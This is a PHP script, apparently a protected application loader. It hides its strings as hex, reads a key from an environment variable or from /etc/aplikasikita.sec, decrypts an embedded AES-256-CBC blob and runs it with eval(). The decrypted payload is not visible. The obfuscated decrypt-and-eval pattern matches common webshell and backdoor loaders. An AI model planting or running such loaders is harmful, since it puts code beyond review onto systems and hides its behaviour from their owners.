<?php

$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('A2vKxEV3u3utiRFrkxpa3A==');

$c=base64_decode(

'IrBfgIRGRCX9I+dgxM9TED92EWdg6t5MW2qrRhhgrzimH6c5Z+T1N212+7sPOd4lqRMYZcG6fn6t' .
'q2H2DTDbtjs8rOMXT7T3UP+M2cExgPc85HAmOy0Wv9dYTMzANgtEMBGtGvvXFdblsawm1TO7k5Bk' .
'sCiKyImEc+v5KpXDsLE7dipeEwDcEZ9O3HLcroINYs1CXTovKHqII75fARWQ51DeFoHF3xKffflF' .
'pe11/edIO17XFRetqgcMW412Zmg06RrJipmdZ/c045uRBrYNtMWSN40+95F9NXcb97b9sZWE+7r+' .
'NrtLyii74iLIgZjcqj+mpdnMcXA4CKh4xr/6hQg4d67/NsrYnNgholVGsP3F1pKLywQJe7nq5GrU' .
'k/JSo1xlBNj9aIWi4xAVXi1V677ulBMlQ39WDwDEBfREYcIZcHstFzzTw0+YJaEVE6KJoHEw8KO3' .
'1lDsVxHZKwwpp8TF3aBWkGtTEyYJMFoILP3htaOQjuIc+mLkSksP7T4N9AcQrSVy4BxB4MWh0ZvK' .
'+OzAu2R/sIB9YJfE5X+6yOGutaRyhtgrjz7+2vPbCzBgUWH+K2zpm0WFBHyoNOh1G2aN5cndq99y' .
'idoJ4ntsOCm9+GS49YKaZ04ek64dpmwmfbIMBOxj/8tlktq2X51OEmi4zu68ER/tEJSC81t+thEw' .
'TjV/uXhQYnyap3ewjrlYlksndVpFtfIgV3dyn7U1wjJrOqjpaqqrmE9ZnD02qTNzaRkZr7RQvevh' .
'ph63Bg9X9mdmG21Tx20JliDzEJDRZgGzdpkhJySqrNpA5MhCioQWR084fz9+MdL5ia5RLAwGASMv' .
'isH9XPqvNjPYnr9pqRHYbDhd1vpD6uuOvyDNrNevB7I/xQpzMu57DggTck67nT505XgZtyhMhKBa' .
'+7Z5m4uknDa6Yc8aUE3HcGuCl2GRc/jXtbw03QjeE4CfXN9bm0CxjRHzQ8pIe7Ips6hLYSoHKRci' .
'4xgy7YG56TcVHiHORn4iyhV41e5l7be01RTOrhX0XwNTamG1ESQeP+rDLA1gYrcmVF4ZTABgSXW0' .
'ztA66y3RA+BkKmGKGmH3FD5LPTIcvfxs/EOI+Y5Ow6/TQg2xswX+OtF/aR0a7m1xnyVBf5Mq8dkl' .
'6+EoliA56SdGTKbY832APTXCz3qDNnYzZfSmWTRUjkqZ7Os3SoO+ohtChfw2dBe7+XsjySosgY4C' .
'xwZqqdDVc4LDBTdvwSwWSmbanzNDJLlC0o4/dc9e8SlWk7hyx8MjCb0FzxEBaZnKW9cj037Drpla' .
'VKvGy8XqAXHwYztf85HgfWp/COrFCX70qoWyogkQotaj/6+CN0tlb4jcTePgvNMVnxlypIjNbDSI' .
'fO/F2MYH1vM+ho3a0KdC9pBsVBH8PnHriqasfn8lxBeoN1Ja4x/kUij02U3/sr1bwvjste+e58Gf' .
'RW8Jxq8HDDtx1twEYIXWgn5ZmTdKKAfy5P/ZJCDVA9/NMkaXLPCImN5mfhUkcBam/DLL3Y7eHMAj' .
'hDwmoT/eudt/mSfrcET7q+q7Zr80LWYH7OCccUj0DVsKdajNwwLKe8LlR/JEx/WlfZgtGA9T0/Ve' .
'YGdF0YnZdNdzlpFgs3tWvqxKNZrD5mL92yQ6fN2bXN16u1cz6t/XPC9wZmKVWeWVU8rWSe7fcDzx' .
'n90UCSWNjdaqgrSdey8MFe4BMfkqpS/PScVW7J5YfJOxRKGmAekvE4gnfVhZkQJjHiABcjMEwU+a' .
'9+E1XSYlgtmEt+8H8tRpAbpcFRsP35b+ThNUyRI7Ozc1jc3KWsYSKLM0IXwQT9hSC5u9x1jkQoSw' .
'BMWl1tUeSWnjzkDveOztqaqkCixtKgu+SvqcV1zZSqjyW52o6mIQJ4Gw9tRm8mRiGmbd3OllbZXN' .
'uAWga5bqjJ/eyzJcKE0YI2gYG3QxbKtCYw0bx4IgbsUj0Z0pTlUaHhgmK7zG+EDhXRVY3IADCsCA' .
'yihcZEggWOuj+CsalOG4HRdbolOZ9hO3PgoPJ37w0gW5Ibjn5S4jH8khB/n3FqPZdLUKb68QjO+U' .
't31dQaPnI1/XSXwdb50VDbxPxuQ9sJ/tBr7xttIvogk12Q9Dq1r5KKYlYeRCPNdK2ZlZEVOkAM4v' .
'67s0J/svWDhhJilCgbKfLxvcTgjP9z8IIz++jluoAnAE23l32DHskbTFQr1mCC5zXH7jOl0GkSFB' .
'QDuYcKDosNMI/fNkwdkQnwG6cwQ2DRffk+9D3CODNSc/ZYkRRiT64ir7PNTp8idOt6sEnR8Aumdr' .
'dri17qfuynK/JhE9z3AYnd548qn+3m/ZNe+bqmKaFBa35w=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval('?>'.$d);

